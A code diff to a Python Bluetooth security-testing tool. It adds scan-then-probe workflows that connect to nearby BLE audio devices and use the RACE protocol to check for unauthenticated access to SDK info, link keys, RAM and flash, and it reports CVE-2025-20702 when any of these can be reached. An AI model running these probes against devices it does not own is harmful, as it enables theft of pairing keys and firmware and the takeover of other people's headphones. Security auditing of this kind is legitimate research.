@@ -175,6 +175,8 @@ def sanitize_address(addr: object) -> str:
     import re
 
     addr_str = str(addr)
+    # Remove emoji variation selectors for consistent matching
+    addr_str = addr_str.replace("\uFE0F", "").replace("\uFE0E", "")
 
     # Check for /P suffix (public address indicator)
     has_suffix = "/P" in addr_str
@@ -186,6 +188,7 @@ def sanitize_address(addr: object) -> str:
         "🅰": "A",  # U+1F170 NEGATIVE SQUARED LATIN CAPITAL LETTER A
         "🅱": "B",  # U+1F171 NEGATIVE SQUARED LATIN CAPITAL LETTER B
         "🅾": "O",  # U+1F17E NEGATIVE SQUARED LATIN CAPITAL LETTER O
+        "💿": "CD",  # U+1F4BF OPTICAL DISC
         # Add more if discovered
     }
     for emoji, replacement in emoji_to_hex.items():
@@ -995,6 +998,78 @@ def parse_args():
         help="Connection timeout in seconds (default: 10)",
     )
 
+    # BLE Workflow: scan -> ble-info -> sdkinfo
+    ble_workflow_sdkinfo_parser = subparsers.add_parser(
+        "ble-workflow-sdkinfo",
+        help="Scan BLE, select device, run ble-info, then sdkinfo over RACE",
+    )
+    ble_workflow_sdkinfo_parser.add_argument(
+        "--scan-time",
+        type=float,
+        default=6.0,
+        help="Scan duration in seconds (default: 6)",
+    )
+    ble_workflow_sdkinfo_parser.add_argument(
+        "--filter", type=str, help="Filter by device name (substring match)"
+    )
+    ble_workflow_sdkinfo_parser.add_argument(
+        "--filter-addr", type=str, help="Filter by MAC address (prefix match)"
+    )
+    ble_workflow_sdkinfo_parser.add_argument(
+        "--interactive",
+        action=argparse.BooleanOptionalAction,
+        default=True,
+        help="Prompt to choose device (default). Use --no-interactive to auto-select strongest.",
+    )
+    ble_workflow_sdkinfo_parser.add_argument(
+        "--timeout",
+        type=float,
+        default=10.0,
+        help="BLE connection timeout for ble-info (default: 10)",
+    )
+    ble_workflow_sdkinfo_parser.add_argument(
+        "--authenticate",
+        action="store_true",
+        default=argparse.SUPPRESS,
+        help="Try to authenticate/pair during connection.",
+    )
+
+    # BLE Workflow: scan -> ble-info -> enumerate-race
+    ble_workflow_enum_parser = subparsers.add_parser(
+        "ble-workflow-enumerate",
+        help="Scan BLE, select device, run ble-info, then enumerate-race",
+    )
+    ble_workflow_enum_parser.add_argument(
+        "--scan-time",
+        type=float,
+        default=6.0,
+        help="Scan duration in seconds (default: 6)",
+    )
+    ble_workflow_enum_parser.add_argument(
+        "--filter", type=str, help="Filter by device name (substring match)"
+    )
+    ble_workflow_enum_parser.add_argument(
+        "--filter-addr", type=str, help="Filter by MAC address (prefix match)"
+    )
+    ble_workflow_enum_parser.add_argument(
+        "--interactive",
+        action=argparse.BooleanOptionalAction,
+        default=True,
+        help="Prompt to choose device (default). Use --no-interactive to auto-select strongest.",
+    )
+    ble_workflow_enum_parser.add_argument(
+        "--timeout",
+        type=float,
+        default=10.0,
+        help="BLE connection timeout for ble-info (default: 10)",
+    )
+    ble_workflow_enum_parser.add_argument(
+        "--authenticate",
+        action="store_true",
+        default=argparse.SUPPRESS,
+        help="Try to authenticate/pair during connection.",
+    )
+
     # BLE Speaker Control PoC (Experimental)
     ble_speaker_parser = subparsers.add_parser(
         "ble-speaker",
@@ -1274,7 +1349,7 @@ def _display_and_select_ble_device(devices_dict: dict, rssi_dict: dict | None = 
         )
         if len(display_name) > 34:
             display_name = display_name[:31] + "..."
-        addr_str = sanitize_display(address)
+        addr_str = sanitize_address(address)
 
         style = get_rssi_style(rssi)
         table.add_row(
@@ -1305,12 +1380,179 @@ def _display_and_select_ble_device(devices_dict: dict, rssi_dict: dict | None = 
         if 0 <= idx < len(devices_with_rssi):
             addr, name, rssi = devices_with_rssi[idx]
             logging.info("Selected: %s (%s)", name if name else addr, addr)
-            return (addr, name)
+            return (sanitize_address(addr), name)
         logging.error("Invalid selection. Number out of range.")
         return False
     except ValueError:
         logging.error("Invalid input. Please enter a number or X.")
         return False
+
+
+async def _scan_ble_candidates(
+    controller: str,
+    scan_time: float,
+    name_filter: str | None,
+    addr_filter: str | None,
+) -> list[dict[str, Any]]:
+    """Scan for BLE devices and return candidates sorted by RSSI."""
+    from bumble.device import Device, DeviceConfiguration, Advertisement
+    from bumble.transport import open_transport_or_link
+    from bumble.hci import Address
+    from bumble.core import AdvertisingData
+
+    if scan_time <= 0:
+        logging.warning("Scan time must be > 0; defaulting to 6 seconds.")
+        scan_time = 6.0
+
+    release_bluetooth_controller(controller)
+
+    t = None
+    device = None
+    candidates: dict[str, dict[str, Any]] = {}
+
+    name_filter_lower = name_filter.lower() if name_filter else None
+    addr_filter_upper = addr_filter.upper() if addr_filter else None
+
+    def on_adv(adv: Advertisement) -> None:
+        addr_str = sanitize_address(adv.address)
+        if not addr_str:
+            return
+        if addr_filter_upper and not addr_str.upper().startswith(addr_filter_upper):
+            return
+
+        name = None
+        if adv.data:
+            name = adv.data.get(AdvertisingData.COMPLETE_LOCAL_NAME)
+            if not name:
+                name = adv.data.get(AdvertisingData.SHORTENED_LOCAL_NAME)
+            if name and isinstance(name, bytes):
+                name = name.decode("utf-8", errors="replace")
+
+        if name_filter_lower and (not name or name_filter_lower not in name.lower()):
+            return
+
+        rssi = adv.rssi
+        entry = candidates.get(addr_str)
+        if entry:
+            entry["rssi"] = max(entry.get("rssi", -999), rssi)
+            if name and entry.get("name") in ("", "(unknown)"):
+                entry["name"] = name
+        else:
+            candidates[addr_str] = {
+                "addr": addr_str,
+                "address": adv.address,
+                "name": name or "(unknown)",
+                "rssi": rssi,
+            }
+
+    try:
+        t = await open_transport_or_link(controller)
+        config = DeviceConfiguration()
+        config.keystore = "JsonKeyStore"
+        config.address = Address.generate_static_address()
+        config.name = "BLEWorkflowScanner"
+        device = Device.from_config_with_hci(config, t.source, t.sink)
+        await device.power_on()
+
+        device.on("advertisement", on_adv)
+        await device.start_scanning(
+            active=True,
+            filter_duplicates=False,
+            scan_interval=96,
+            scan_window=48,
+        )
+
+        logging.info("Scanning for BLE devices (%.1fs)...", scan_time)
+        await asyncio.sleep(scan_time)
+
+        device.remove_listener("advertisement", on_adv)
+        await device.stop_scanning()
+    except Exception as exc:  # pylint: disable=broad-exception-caught
+        logging.error("BLE scan failed: %s", exc)
+    finally:
+        try:
+            if device:
+                await device.stop_scanning()
+        except Exception:  # pylint: disable=broad-exception-caught
+            pass
+        try:
+            if device:
+                await device.power_off()
+        except Exception:  # pylint: disable=broad-exception-caught
+            pass
+        try:
+            if t:
+                await t.close()
+        except Exception:  # pylint: disable=broad-exception-caught
+            pass
+
+    results = list(candidates.values())
+    results.sort(key=lambda item: item.get("rssi", -999), reverse=True)
+    return results
+
+
+def _select_ble_candidate(
+    candidates: list[dict[str, Any]], interactive: bool
+) -> dict[str, Any] | None:
+    """Select a BLE candidate; auto-select strongest unless interactive."""
+    if not candidates:
+        return None
+
+    if interactive:
+        devices_dict = {c["addr"]: c.get("name") for c in candidates}
+        rssi_dict = {c["addr"]: c.get("rssi", -999) for c in candidates}
+        selection = _display_and_select_ble_device(devices_dict, rssi_dict)
+        if not selection:
+            return None
+        selected_addr, _ = selection
+        for candidate in candidates:
+            if candidate["addr"] == selected_addr:
+                return candidate
+        return None
+
+    return candidates[0]
+
+
+async def _resolve_ble_target(
+    args: argparse.Namespace,
+) -> tuple[str | None, object | None, str | None]:
+    """Resolve target BLE address via scan or direct input."""
+    if args.target_address:
+        logging.info(
+            "Using provided target address: %s",
+            sanitize_display(args.target_address),
+        )
+        return args.target_address, None, None
+
+    candidates = await _scan_ble_candidates(
+        args.controller,
+        getattr(args, "scan_time", 6.0),
+        getattr(args, "filter", None),
+        getattr(args, "filter_addr", None),
+    )
+
+    if not candidates:
+        logging.error("No BLE devices found. Try --scan-time or --filter.")
+        return None, None, None
+
+    selected = _select_ble_candidate(
+        candidates, getattr(args, "interactive", True)
+    )
+    if not selected:
+        logging.info("No BLE device selected.")
+        return None, None, None
+
+    name = selected.get("name") or "(unknown)"
+    logging.info(
+        "Selected device: %s (%s), RSSI %sdBm",
+        sanitize_display(name),
+        sanitize_display(selected["addr"]),
+        selected.get("rssi", -999),
+    )
+    if len(candidates) > 1 and not getattr(args, "interactive", True):
+        logging.info("Auto-selected strongest device. Use --interactive to choose.")
+
+    return selected["addr"], selected.get("address"), name
 
 
 def _is_valid_dump(data: bytes, threshold: float = 0.95) -> bool:
@@ -2860,7 +3102,7 @@ async def command_ble_scan(args: argparse.Namespace):
             tracker = info.get("tracker")
 
             # Sanitize all display data
-            addr_str = sanitize_display(addr)
+            addr_str = sanitize_address(addr)
             name_str = sanitize_display(raw_name) if raw_name else "(unknown)"
             vendor_str = sanitize_display(raw_vendor)
 
@@ -3092,16 +3334,30 @@ async def command_ble_scan(args: argparse.Namespace):
 
                 # Determine device type from services
                 service_types = []
+                has_battery = False
+                audio_hint = False
+                audio_service_fragments = (
+                    "1108",  # Headset
+                    "110b",  # Audio Sink
+                    "110a",  # Audio Source
+                    "111e",  # Handsfree
+                    "111f",  # Handsfree AG
+                    "1843",  # Audio Input Control
+                    "1844",  # Volume Control
+                    "1845",  # Volume Offset
+                    "184e",  # Audio Stream Control
+                    "1855",  # Telephony and Media Audio
+                )
                 for service in peer.services:
                     suuid = str(service.uuid).lower()
                     if "1812" in suuid:
                         service_types.append("HID")
                     elif "180d" in suuid:
                         service_types.append("Heart Rate")
-                    elif "180" in suuid:
-                        service_types.append("Battery")
-                    elif "1108" in suuid or "110b" in suuid or "110a" in suuid:
-                        service_types.append("Audio")
+                    elif "180f" in suuid:
+                        has_battery = True
+                    elif any(fragment in suuid for fragment in audio_service_fragments):
+                        audio_hint = True
 
                 # Read key characteristics
                 for service in peer.services:
@@ -3146,8 +3402,43 @@ async def command_ble_scan(args: argparse.Namespace):
                         except Exception:  # pylint: disable=broad-exception-caught
                             pass
 
+                appearance_lower = str(info.get("appearance") or "").lower()
+                name_lower = (info.get("name") or "").lower()
+                headset_keywords = (
+                    "headphone",
+                    "headset",
+                    "earbud",
+                    "earbuds",
+                    "earphone",
+                    "earphones",
+                    "airpod",
+                    "airpods",
+                    "wh-",
+                    "wf-",
+                    "wi-",
+                )
+
+                audio_type = None
+                if any(keyword in name_lower for keyword in headset_keywords) or any(
+                    keyword in appearance_lower for keyword in ("headphone", "headset")
+                ):
+                    audio_type = "Headphones/Headset"
+                elif any(keyword in name_lower for keyword in ("speaker", "soundbar")) or any(
+                    keyword in appearance_lower for keyword in ("speaker", "audio sink")
+                ):
+                    audio_type = "Speaker/Audio"
+                elif audio_hint or any(
+                    keyword in appearance_lower for keyword in ("audio", "hearing aid")
+                ):
+                    audio_type = "Audio"
+
+                if audio_type:
+                    service_types.append(audio_type)
+                elif has_battery:
+                    service_types.append("Battery")
+
                 if service_types:
-                    info["device_type"] = "/".join(set(service_types))
+                    info["device_type"] = "/".join(dict.fromkeys(service_types))
 
             except BumbleTimeoutError:
                 info["connectable"] = False
@@ -3340,24 +3631,15 @@ async def command_ble_scan(args: argparse.Namespace):
         raw_name = info.get("name") or ""
         raw_vendor = info.get("vendor") or ""
         services = info.get("services_count", 0)
-        connectable = info.get("connectable", False)
         tracker = info.get("tracker")
 
         # Sanitize all display data
-        addr_str = sanitize_display(addr)
+        addr_str = sanitize_address(addr)
         name_str = sanitize_display(raw_name) if raw_name else "(unknown)"
         vendor_str = sanitize_display(raw_vendor)
 
         # Get style using helper
         style = get_rssi_style(rssi)
-
-        # Connection indicator
-        if connectable:
-            conn_icon = "[green]●[/green]"
-        elif tracker:
-            conn_icon = "[yellow]⚠[/yellow]"
-        else:
-            conn_icon = "[bright_black]○[/bright_black]"
 
         # TYPE column
         if tracker:
@@ -3375,7 +3657,7 @@ async def command_ble_scan(args: argparse.Namespace):
 
         table.add_row(
             str(idx),
-            f"{conn_icon} {addr_str}",
+            addr_str,
             f"{rssi}dBm",
             name_str,
             device_type,
@@ -3385,10 +3667,6 @@ async def command_ble_scan(args: argparse.Namespace):
         )
 
     print_table(table)
-    print()
-    print(
-        "  \033[1;32m●\033[0m = Connectable    \033[1;90m○\033[0m = Not connectable    \033[1;33m⚠\033[0m = Potential Tracker"
-    )
     print()
     print(
         "  \033[1;4mSignal Strength:\033[0m  "
@@ -6875,6 +7153,94 @@ async def command_ble_info(args: argparse.Namespace):  # pyright: ignore[reportG
             pass
 
 
+async def _run_ble_workflow(
+    args: argparse.Namespace,
+    race_label: str,
+    race_action: Callable[[RACE], Any],
+) -> None:
+    """Run scan -> ble-info -> RACE workflow for a target device."""
+    def _log_race_guidance() -> None:
+        if args.authenticate:
+            logging.info(
+                "Try: pair in the OS/phone first then rerun without --authenticate, "
+                "ensure the device isn't connected elsewhere, or use --transport rfcomm "
+                "with the Classic address."
+            )
+            return
+        logging.info(
+            "Try: --authenticate, ensure the device isn't connected elsewhere, "
+            "or use --transport rfcomm with the Classic address."
+        )
+
+    if args.transport.lower() != "gatt":
+        logging.info("Overriding transport to gatt for BLE workflow.")
+
+    logging.info("Workflow: scan -> ble-info -> %s", race_label)
+    logging.info("Step 1/3: scan and select BLE device")
+
+    target_addr, target_addr_obj, target_name = await _resolve_ble_target(args)
+    if not target_addr:
+        return
+
+    display_target = sanitize_display(target_name or target_addr)
+    logging.info("Step 2/3: ble-info for %s", display_target)
+
+    ble_info_args = argparse.Namespace(
+        controller=args.controller,
+        target_address=target_addr,
+        timeout=getattr(args, "timeout", 10.0),
+    )
+    try:
+        await command_ble_info(ble_info_args)
+    except Exception as exc:  # pylint: disable=broad-exception-caught
+        logging.warning("BLE info failed: %s", exc)
+
+    logging.info("Step 3/3: %s via RACE", race_label)
+    release_bluetooth_controller(args.controller)
+
+    transport = GATTBumbleTransport(
+        args.controller,
+        target_addr_obj or target_addr,
+        args.le_names or [],
+        args.authenticate,
+    )
+    r = RACE(transport, args.send_delay)
+    try:
+        await race_action(r)
+    except asyncio.TimeoutError as exc:
+        logging.error("RACE step timed out: %s", exc)
+        if "No inbound RACE notifications observed" in str(exc):
+            logging.info(
+                "RACE service is present but not responding to commands."
+            )
+        _log_race_guidance()
+        return
+    except ConnectionError as exc:
+        logging.error("RACE step failed: %s", exc)
+        _log_race_guidance()
+        return
+    finally:
+        await r.close()
+
+
+async def command_ble_workflow_sdkinfo(args: argparse.Namespace) -> None:
+    """Scan, run ble-info, then retrieve SDK info via RACE."""
+
+    async def run_sdkinfo(r: RACE) -> None:
+        await command_sdkinfo(r, args.outfile)
+
+    await _run_ble_workflow(args, "sdkinfo", run_sdkinfo)
+
+
+async def command_ble_workflow_enumerate(args: argparse.Namespace) -> None:
+    """Scan, run ble-info, then run enumerate-race via RACE."""
+
+    async def run_enumerate(r: RACE) -> None:
+        await command_enumerate_race(r)
+
+    await _run_ble_workflow(args, "enumerate-race", run_enumerate)
+
+
 # =============================================================================
 # BLE SPEAKER CONTROL PoC
 # =============================================================================
@@ -9019,6 +9385,8 @@ async def command_enumerate_race(r: RACE):
     logging.info("ENUMERATING ACCESSIBLE DATA:")
     logging.info("-" * 60)
     logging.info("")
+    accessible_any = False
+    accessible_items: list[str] = []
 
     # Try to get SDK info
     logging.info("[1] SDK Information:")
@@ -9028,6 +9396,8 @@ async def command_enumerate_race(r: RACE):
         sdk_info = res[7:].decode("utf8", errors="replace").strip("\x00")
         logging.info("    %s", sdk_info)
         logging.info("    -> ACCESSIBLE")
+        accessible_any = True
+        accessible_items.append("SDK Information")
     except Exception as e:  # pylint: disable=broad-exception-caught
         logging.info("    -> Not accessible: %s", e)
 
@@ -9040,6 +9410,8 @@ async def command_enumerate_race(r: RACE):
         build_ver = res[7:].decode("utf8", errors="replace").strip("\x00")
         logging.info("    %s", build_ver)
         logging.info("    -> ACCESSIBLE")
+        accessible_any = True
+        accessible_items.append("Build Version")
     except Exception as e:  # pylint: disable=broad-exception-caught
         logging.info("    -> Not accessible: %s", e)
 
@@ -9053,6 +9425,8 @@ async def command_enumerate_race(r: RACE):
         formatted_addr = ":".join(f"{b:02X}" for b in addr_pkt.bd_addr)
         logging.info("    %s", formatted_addr)
         logging.info("    -> ACCESSIBLE")
+        accessible_any = True
+        accessible_items.append("Bluetooth Address")
     except Exception as e:  # pylint: disable=broad-exception-caught
         logging.info("    -> Not accessible: %s", e)
 
@@ -9074,6 +9448,8 @@ async def command_enumerate_race(r: RACE):
                 logging.info("    -> Command accessible, no data present")
         else:
             logging.info("    -> Command accessible")
+        accessible_any = True
+        accessible_items.append("Bluetooth Link Keys")
     except Exception as e:  # pylint: disable=broad-exception-caught
         logging.info("    -> Not accessible: %s", e)
 
@@ -9084,9 +9460,13 @@ async def command_enumerate_race(r: RACE):
         # Try to read a small chunk from a typical RAM address
         dumper = RACERAMDumper(r, 0x04200000, 16, progress=False)
         sample_data = await dumper.dump()
-        if sample_data:
+        if sample_data and not dumper.had_errors:
             logging.info("    Successfully read 16 bytes from RAM")
             logging.info("    -> ACCESSIBLE - Full memory read possible!")
+            accessible_any = True
+            accessible_items.append("RAM Access")
+        elif dumper.had_errors:
+            logging.info("    -> Not accessible: read error(s) returned by device")
         else:
             logging.info("    -> Read returned empty data")
     except Exception as e:  # pylint: disable=broad-exception-caught
@@ -9098,9 +9478,13 @@ async def command_enumerate_race(r: RACE):
     try:
         flash_dumper = RACEFlashDumper(r, 0x0, 0x100)
         sample_flash = await flash_dumper.dump()
-        if sample_flash:
+        if sample_flash and not flash_dumper.had_errors:
             logging.info("    Successfully read 256 bytes from Flash")
             logging.info("    -> ACCESSIBLE - Full firmware dump possible!")
+            accessible_any = True
+            accessible_items.append("Flash Access")
+        elif flash_dumper.had_errors:
+            logging.info("    -> Not accessible: read error(s) returned by device")
         else:
             logging.info("    -> Read returned empty data")
     except Exception as e:  # pylint: disable=broad-exception-caught
@@ -9109,19 +9493,37 @@ async def command_enumerate_race(r: RACE):
     # Summary
     logging.info("")
     logging.info("=" * 60)
-    logging.info("VULNERABILITY CONFIRMED: CVE-2025-20702")
-    logging.info("=" * 60)
-    logging.info("")
-    logging.info("The RACE protocol is exposed without authentication.")
-    logging.info("An attacker can:")
-    logging.info("  1. Read device firmware and extract secrets")
-    logging.info("  2. Dump Bluetooth link keys to impersonate paired devices")
-    logging.info("  3. Read/write device memory for code execution")
-    logging.info("  4. Flash malicious firmware updates")
-    logging.info("")
-    logging.info("Combined with CVE-2025-20701 (no BR/EDR auth), an attacker")
-    logging.info("can fully compromise this device from up to 10 meters away.")
-    logging.info("")
+    if accessible_any:
+        logging.info("VULNERABILITY CONFIRMED: CVE-2025-20702")
+        logging.info("=" * 60)
+        logging.info("")
+        if accessible_items:
+            logging.info("Accessible endpoints: %s", ", ".join(accessible_items))
+        logging.info("The RACE protocol is exposed without authentication.")
+        logging.info("An attacker can:")
+        logging.info("  1. Read device firmware and extract secrets")
+        logging.info("  2. Dump Bluetooth link keys to impersonate paired devices")
+        logging.info("  3. Read/write device memory for code execution")
+        logging.info("  4. Flash malicious firmware updates")
+        logging.info("")
+        logging.info("Combined with CVE-2025-20701 (no BR/EDR auth), an attacker")
+        logging.info("can fully compromise this device from up to 10 meters away.")
+        logging.info("")
+    else:
+        logging.info("VULNERABILITY NOT CONFIRMED")
+        logging.info("=" * 60)
+        logging.info("")
+        logging.info(
+            "No unauthenticated RACE data access observed; commands timed out or returned errors."
+        )
+        logging.info(
+            "The device may require pairing/encryption, block RACE over BLE, or use a different endpoint."
+        )
+        logging.info(
+            "Try: --authenticate, ensure the device isn't connected elsewhere, "
+            "or use --transport rfcomm with the Classic address."
+        )
+        logging.info("")
 
 
 async def command_raw(r: RACE, cmd_id: int, outfile: str):
@@ -9326,6 +9728,12 @@ async def main():
         return
     if args.command == "ble-info":
         await command_ble_info(args)
+        return
+    if args.command == "ble-workflow-sdkinfo":
+        await command_ble_workflow_sdkinfo(args)
+        return
+    if args.command == "ble-workflow-enumerate":
+        await command_ble_workflow_enumerate(args)
         return
     if args.command == "ble-speaker":
         await command_ble_speaker(args)
